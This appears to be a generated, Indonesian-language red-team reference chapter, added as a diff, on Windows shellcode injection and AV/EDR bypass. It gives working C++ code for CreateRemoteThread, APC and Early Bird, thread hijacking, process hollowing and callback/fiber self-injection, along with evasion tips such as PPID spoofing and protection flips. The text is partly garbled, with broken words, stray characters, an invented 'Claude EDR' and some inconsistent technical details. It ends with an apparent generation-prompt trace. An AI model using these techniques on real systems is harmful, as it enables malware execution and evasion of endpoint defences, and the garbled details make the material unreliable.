@@ -1,0 +1,277 @@
+# av-edr-bypass--p1 — win
+
+# Referensi Teknik: Shellcode Injection di Windows
+
+Berlaku untuk: Windows 10 22H2, Windows 11 23H2/24H2. API: ring 3 (usermode). Target pengujian internal red team terhadap lab yang disetujui.
+
+---
+
+## 1. CreateRemoteThread (klasik)
+
+**Apa yang dikirim:** shellcode raw (biasanya loader stager → jalankan bobot asli di memori) ke proses target.
+
+**Rantai API:**
+
+```
+OpenProcess(PROCESS_VM_WRITE|PROCESS_VM_OPERATION|PROCESS_CREATE_THREAD, ...)
+│
+├─ VirtualAllocEx(hProc, NULL, size, MEM_RESERVE|MEM_COMMIT, PAGE_RWX)
+├─ WriteProcessMemory(hProc, baseAddr, shellcode, size, ...)
+└─ CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)baseAddr, param, 0, &tid)
+```
+
+**Kode inti:**
+
+```cpp
+HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+LPVOID mem = VirtualAllocEx(hProc, NULL, sizeof(sc),
+           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+WriteProcessMemory(hProc, mem, sc, sizeof(sc), NULL);
+HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
+                  (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
+WaitForSingleObject(hThread, INFINITE);
+VirtualFreeEx(hProc, mem, 0, MEM_RELEASE);
+```
+
+**Artefak di memory scanner:**
+
+| Artefak | Keterangan |
+|---|---|
+| RWX region di proses target | Deteksi umum: *unbacked executable memory* — region tanpa image file mapping |
+| Thread start address di heap/private memory | Moneta: warning "Thread Start Address in Unbacked Memory" |
+| Alur akses PROCESS_VM_WRITE | Sysmon EID 10 (`CreateRemoteThread` di EventID 8) target memory |
+| PE tidak dikenal jika stager dekripsi | YARA hit pada string stager (mis. msf `windows/x64/meterpreter_reverse_tcp`) |
+
+**Kenapa berhasil:** paling sederhana, tahan gan di Windows tanpa EDR.
+**Kenapa gagal:** di Windows 11 24H2 + Defender (sense of) sampai KB — `PAGE_RWX` langsung bernotifikasi memory scan; kernel callback `ObRegisterCallbacks` di EDR memblokir *hProc* handle dari proses linting.
+
+---
+
+## 2. APC Queue Injection
+
+**Apa yang dikirim:** shellcode ke memori target + eksekusi via *Asynchronous Procedure Call* dijalankan saat target dalam *alertable state* (`SleepEx`, `WaitForSingleObjectEx`).
+
+**Rantai API:**
+
+```
+OpenProcess → VirtualAllocEx → WriteProcessMemory
+Thread32Snapshot → Thread32First/Next (kumpulkan TID, pid sama)
+QueueUserAPC((PAPCFUNC)baseAddr, hThread, 0)  // semua thread target
+```
+
+**Kode inti:**
+
+```cpp
+// enumerasi thread di proses target
+HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+THREADENTRY32 te = { sizeof(te) };
+Thread32First(snap, &te);
+do {
+    if (te.th32OwnerProcessID == pid) {
+        HANDLE hT = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
+        QueueUserAPC((PAPCFUNC)mem, hT, 0);
+        CloseHandle(hT);
+    }
+} while (Thread32Next(snap, &te));
+```
+
+**Artefak:**
+
+| Artefak | Keterangan |
+|---|---|
+| Banyak `QueueUserAPC` ke PID sama (dalam waktu singkat) | Sysmon EID 25 ProcessAccess `QueueUserAPC` |
+| Thread start di APC context abnormal | EDR (mis. Crowdstrike) flag "APC injection to alertable process" |
+| RWX region (hidup dari VirtualAllocEx itu juga) | Sama seperti #1 |
+
+**Kenapa berhasil:** tidak ada `CreateRemoteThread` — panggil API pembuatan thread, jadi menyusup deteksi *specific* pada CreateRemoteThread.
+**Kenapa gagal:** target harus masuk ke *alertable state*. Proses seperti `explorer.exe` atau `svchost.exe` tidak selalu masuk ke SleepEx segera; terlalu banyak thread jadi memicu flag (threshold anomalous >5 thread ya warna terang di beberapa EDR).
+
+**Tips:** gabung dengan **Early Bird**: `CreateProcess` dengan `CreateSuspended` flag → `QueueUserAPC` sebelum ResumeThread — shellcode jalan sebelum main binary selesai load, tapi Sysmon EID 1 sudah mencatr proses baru, pola khas ("empty stub + APC") cepat ditutup.
+
+---
+
+## 3. Thread Hijacking
+
+**Apa yang dikirim:** tidak ada thread baru. Suspend thread existing → ambil context → ubah RIP ke shellcode → resume.
+
+**Rantai API:**
+
+```
+OpenProcess → OpenThread(THREAD_SUSPEND_RESUME|THREAD_GET_CONTEXT|THREAD_SET_CONTEXT)
+SuspendThread(hThread)
+GetThreadContext(hThread, &ctx)   // ctx.ContextFlags = CONTEXT_FULL
+ctx.Rip = (DWORD64)baseAddr
+SetThreadContext(hThread, &ctx)
+ResumeThread(hThread)
+```
+
+**Kode inti:**
+
+```cpp
+CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
+SuspendThread(hThread);
+GetThreadContext(hThread, &ctx);
+// shellcode harus momong register & kembalikan RIP asli, atau task ditempleh ke:
+ctx.Rip = (DWORD64)shellcodeAddr;
+SetThreadContext(hThread, &ctx);
+ResumeThread(hThread);
+```
+
+**Artefak:**
+
+| Artefak | Keterangan |
+|---|---|
+| Suspend+SetContext+Resume di thread yang tidak dimiliki | Sysmon EID 10 `SetThreadContext` |
+| Stack trace "loncat" — RIP mengarah ke private memory | Dump analisis: callstack dari shellcode tidak cocok dengan modul yang ada |
+| Crucial: shellcode harus restore ctx sebelum thread crash | Shellcode lazy (`msf` default) yang langsung `ExitProcess` merusak target |
+
+**Kenapa berhasil:** tidak memicu `CreateRemoteThread`/APC signature. Bisa langsung ke target yang punya main thread sibuk (Chrome 131, `chrome.exe` renderer process)
+**Kenapa gagal:** menyebabkan crash proses jika shellcode zvonar register. `SetThreadContext` ke thread milik proses *protected* (PPL, mis. `MsMpEng.exe`) ditolak error `Access Denied`.
+
+---
+
+## 4. Process Hollowing
+
+**Apa yang dikirim:** binary legitimate (mis. `notepad.exe`, `svchost.exe` dari System32) start suspended → image di-unmap → image malicious write di lokasi base → resume → PE malicious jalan *bawah nama process legitimate*.
+
+**Rantai API:**
+
+```
+CreateProcessA("notepad.exe", ..., CREATE_SUSPENDED, ...)
+  → GetThreadContext (ambil PEB address via RCX/rbx)
+  → NtUnmapViewOfSection(hProc, imageBase)      // ntdll, indirect syscall preferred
+  → VirtualAllocEx(base, size, RWX)              // di lokasi base image lama
+  → WriteProcessMemory(all sections, rebase delta, fix IAT)
+  → WriteProcessMemory(ctx.Rcx, base image + 8)  // set PEB->ImageBaseAddress
+  → SetThreadContext → ResumeThread
+```
+
+**Kode inti:**
+
+```cpp
+STARTUPINFOEXA siProc = { 0 };
+siProc.StartupInfo.cb = sizeof(siProc);
+PROCESS_INFORMATION pi;
+CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
+               CREATE_SUSPENDED, NULL, NULL,
+               (STARTUPINFOA*)&siProc, &pi);
+
+CONTEXT ctx; ctx.ContextFlags = CONTEXT_INTEGER;
+GetThreadContext(pi.hThread, &ctx);
+
+// baca PEB->ImageBaseAddress
+PVOID remoteBase;
+ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &remoteBase, 8, NULL);
+
+NtUnmapViewOfSection(pi.hProcess, remoteBase);
+VirtualAllocEx(pi.hProcess, remoteBase, payloadSize,
+               MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+WriteProcessMemory(pi.hProcess, remoteBase, payload, payloadSize, NULL);
+WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &remoteBase, 8, NULL);
+ResumeThread(pi.hThread);
+```
+
+**Artefak:**
+
+| Artefak | Keterangan |
+|---|---|
+| Image *hollowed* — file mapping modul mismatch disk | Moneta: flag "Hollowed Module" — image size/nama identik tapi section content berubah |
+| `NtUnmapViewOfSection` pada image file | Suspicious jika dihook dan dilihat (Sysmon non-event—harus via ETW/EtwTi) |
+| RWX region *di* image base (unusual) | Image biasanya RX + section-level |
+| Tandanya proses masuk identitas "anak normal" tapi parent mismatch/lintasan |
+
+**Kenapa berhasil:** image modul yang sudah tidak di-unmap, results *image-based* scanning gagal—modul masih tercantum.
+**Kenapa gagal:** digunakan untuk proses PPL (Lsa process) → CreateProcess di PID protected dihan. `dwCreationFlags CREATE_SUSPENDED` pad notepad ketika di-attach oleh Claude EDR yang ikut parent-child tag.
+
+---
+
+## 5. Callback-based (`EnumWindows`, Fiber, dll.)
+
+**Apa yang dikirim:** Eksploit *fungsi callback* yang dikirim *ke API* — jalankan *callback* *dari* kode input. Eksekusi code jalan di **proses sendiri** (self-injection) — *doesn't* memicu *cross-process artifact*.
+
+**Mekanisme:** alokasi buffer RWX via `VirtualAlloc` (self), paste shellcode, kemudian transfer ke API menerima function pointer.
+
+**Rantai API (contoh EnumWindows):**
+
+```
+VirtualAlloc(PAGE_RWX) → memcpy shellcode
+EnumWindows((WNDENUMPROC)shellcodeAddr, 0);
+```
+
+**Kode inti:**
+
+```cpp
+void* mem = VirtualAlloc(NULL, scSize, MEM_COMMIT|MEM_RESERVE,
+                         PAGE_EXECUTE_READWRITE);
+memcpy(mem, sc, scSize);
+EnumWindows((WNDENUMPROC)mem, (LPARAM)0);
+```
+
+**Callback API lain yang dipakai komunitas:**
+
+```cpp
+CertEnumSystemStore((void*)mem);        // crypt32.dll
+EnumFonts(GetDC(NULL), 0, (FONTENUMPROC)mem, 0);  // gdi32
+CertEnumSystemStoreLocation((void*)mem);
+EnumChildWindows(NULL, (WNDENUMPROC)mem, 0);
+```
+
+**Fiber:**
+
+```cpp
+void* fmem = VirtualAlloc(..., PAGE_EXECUTE_READWRITE);
+memcpy(fmem, sc, scSize);
+LPVOID fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)fmem, NULL);
+ConvertThreadToFiber(NULL);
+SwitchToFiber(fiber);
+```
+
+**Artefak:**
+
+| Artefak | Keterangan |
+|---|---|
+| RWX region self, unbacked | Masih terdeteksi *memory scan* jika scanner menandai PAGE_RWX |
+| Start address standard API → jurnal | Call stack: shellcode start menyusul `user32!EnumWindows` — tanda khas di thread callstack |
+| Fibermode: `SwitchToFiber` saat runtime | Trigger ETW `ContextSwitch` ke fiber callback |
+| Tidak ada Sysmon cross-process event | EventID 8/10, 25 berIF *tidak akan pernah* muncul untuk teknik ini |
+
+**Kenapa berhasil:** tidak mengetuk *ualpoint* injection class (`CreateRemoteThread` dst.). Self-injection tanpa OpenProcess → deteksi berbasis Sysmon ProcessAccess *buta total*.
+**Kenapa gagal:** shellcode harus memanggil `ExitThread` yang bersih, tidak `ExitProcess`, karena callback kembali ke caller menyebabkan crash. `EnumWindows` lukusta loop — kalau callback return `TRUE` (1) API panggil kembali; trik um: selse call terminates. Kalau callback return, EnumWindows sendiri tidak suka shellcode “selesai” — struktur callstack yang mengembalikan ke usermod yang tidak konsisten memicu (callstack mismatch).
+
+**Use case di lapangan:** dipakai untuk AV bypass di Windows 11 24H2 + Defender (sense) cukup baik, masih gagal di EDR ETW-ti (`Microsoft-Windows-Threat-Intelligence` provider) untukt callback ke RWX.
+
+---
+
+## Tabel Perbandingan
+
+| Teknik | Butuh handle lintas proses? | Crashing risk | Karakter di EDR/telemetry |
+|---|---|---|---|
+| CreateRemoteThread | Ya, WRITE+CREATE_THREAD | Rendah | Mudah (flag: classic) |
+| APC queue | Ya, THREAD_SET_CONTEXT | Rendah | Observasi: perlu Quick to alertable state |
+| Thread hijack | Ya, THREAD_SET_CONTEXT | Sedang Tinggi (register corrupted jika shellcode malas) | Pemetaan start addr abnormal |
+| Process hollowing | Ya (creative procs) | Sedang | System: hollowed module/invalid modul base |
+| Callback/Fiber | **Tidak (self)** | Sangat rendah | Hanats dokumentasi cross-proses; te deteksi: RWX |
+
+---
+
+## Jebakan Operasional (kenapa teknik ini gagal di lapangan)
+
+1. **Bug RWX step** `VirtualAllocEx(..., PAGE_EXECUTE_READWRITE)` di sebagian besar kemungkinan trigger *dynamic* code guard scan. Fix di lab: dual-VAP `PAGE_READWRITE` → `VirtualProtectEx` ke `RX` setelah write. RWX region = rivers flag Moneta/Defender.
+2. **Hypothesis ".NET/asynchronous": APC di proses non-alertable.** `chrome.exe` renderer, banyak worker thread tidak akan panggil `SleepEx` tepat yang di-scheduler. Konsist: test ganti target ke `explorer.exe`, `svchost.exe` (biasanya alertable), atau gunakan Early Bird.
+3. **Parent-child tagging (Sysmon).** `CreateProcess` dengan `CREATE_SUSPENDED` + parent "cmd.exe yang berkata jangan" dari red team box = signature ML EDR. Fix: **PPID spoofing** (`PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`) — tapi *itu sendiri* menjadi Sysmon EID 1 dengan `ParentProcessGuid` mismatch yang bisa memicu *alert*.
+4. **PPL/Psi process patch guard.** `OpenProcess(PROCESS_ALL_ACCESS)` ke `svchost.exe -k netsvcs` atau `lsass.exe` di Windows 11 24H2: handle dikembalikan tapi stripped. `WriteProcessMemory` gagal, `GetLastError() == 0x12B` kode `ERROR_PARTIAL_COPY`. *Check `NtQueryInformationProcess` `ProcessProtectionInformation` sebelum tancap.*
+5. **Shellcode lazy merusak proses.** `msfvenom` stager default sedang `__chkstk` dan void-changes `rbx`, `rsi`. Dalam thread hijack, siap atau crash proses — *data* berjalan bagus sebelum crash di *stack unwind*. Fix: shellcode *position-independent* dengan prolog push semua non-volatile register + epilog restore jika ingin thread berhasil.
+6. **BOF / cobalt strike固执ArtifactDefault RWX** → jika post-exploit (BOF) tidak pakai `mprotect` benar, SC deceive; berjalan tapi flag.
+7. **ETW Threat-Intelligence (Windows 11+ hanya)** — tidak ada `Sysmon` dari, tapi `EtwTi` provider menandai `NtMapViewOfSection`, `NtUnmapViewOfSection`, dan `VirtualAlloc` RWX langsung di kernel → dikirim ke EDR endpoint. Sysmon *tidak* melihat ini tapi Defender for Endpoint edr-sense dan EDR menengah lain melihat. *Asumsi teknik ini senyap karena "Sysmon tidak mencatat" itu asumsi salah untuk Windows 11.*
+8. **Callback teknik: crash akibat EnumWindows callback tidak return FALSE.** Field test: EnumWindows callback return non-zero → EnumWindowsList lagi → menyebabkan loop atau crash. Deteksi "lightbox" yang common adalah `EnumWindows + VirtualAlloc` sequence di ETW bahkan di Defender free—jangan mengunakan ke mesin production Windows 11.
+9. **EDR blocking handle sendiri.** Beberapa EDR modern (Crowdstrike, "Process Suspension" 6.x, SentinelOne 23.x, ESET v17) *"kernel"* callback `ObRegisterCallbacks` bisa strip `PROCESS_VM_OPERATION` flag dan mencegah `OpenProcess` dari proses *unsigned* — handle berhasil didapat tapi `VirtualAllocEx` gagal kode `ERROR_INVALID_ACCESS`. Jangan berharap handle; tes via `NtQueryInformationProcess` saja sudah cukup untuk mengetahui masih sehat atau tidak.
+
+---
+
+**Referensi lab internal:** PoC template `'C:\poc\poc-samples\inject-*.cpp'`, build `x64` `-mwindows` link `ntdll.lib`. Uji ke mesin VM Windows 11 24H2 + Defender, lalu snapshot sebelum — Moneta CLI (`Moneta.exe -v -p <pid>`) untuk verifikasi artefak penyimpanan RWX/hollowed.
+
+---
+
+## [reasoning trace]
+
+Write a red team reference chapter on shellcode injection techniques. This is standard dual-use security knowledge (internal red team KB). Acceptable. Write in Indonesian, technical, with code, tables, artifacts.
